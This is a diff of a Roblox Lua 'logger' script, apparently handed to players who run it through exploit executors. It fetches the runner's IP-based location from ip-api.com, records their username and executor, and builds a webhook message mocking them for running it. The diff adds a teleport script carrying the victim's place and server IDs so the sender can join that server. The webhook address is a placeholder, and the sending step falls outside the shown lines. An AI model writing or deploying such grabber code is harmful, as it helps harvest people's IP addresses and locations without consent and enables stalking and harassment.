@@ -1,12 +1,15 @@
+local join_script = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", game.PlaceId, game.JobId)
+print(helo)
+ 
 local webhookcheck =
    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
    secure_load and "Sentinel" or
    KRNL_LOADED and "Krnl" or
    SONA_LOADED and "Sona" or
    "Kid with shit exploit"
-
+ 
 local url =
-   "UR WEBHOOK HERE"
+   "Your webhook here"
 local data = {
    ["content"] = " @everyone **" ..game.Players.LocalPlayer.Name.. "** EXACUTED UR LOGGER LOL",
    ["embeds"] = {
@@ -15,15 +18,16 @@ local data = {
            ["description"] = "**"..game:HttpGet("http://ip-api.com/line/?fields=61439").. "Username: "  ..game.Players.LocalPlayer.Name..", Uses: " ..webhookcheck.. "**",
            ["type"] = "rich",
            ["color"] = tonumber(0x7269da),
-           ["image"] = {
-               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
-                   tostring(game:GetService("Players").LocalPlayer.Name)
+           ["footer"] = {
+             ["text"] = "" ..join_script.. ""
            }
        }
    }
 }
+ 
+ 
 local newdata = game:GetService("HttpService"):JSONEncode(data)
-
+ 
 local headers = {
    ["content-type"] = "application/json"
 }
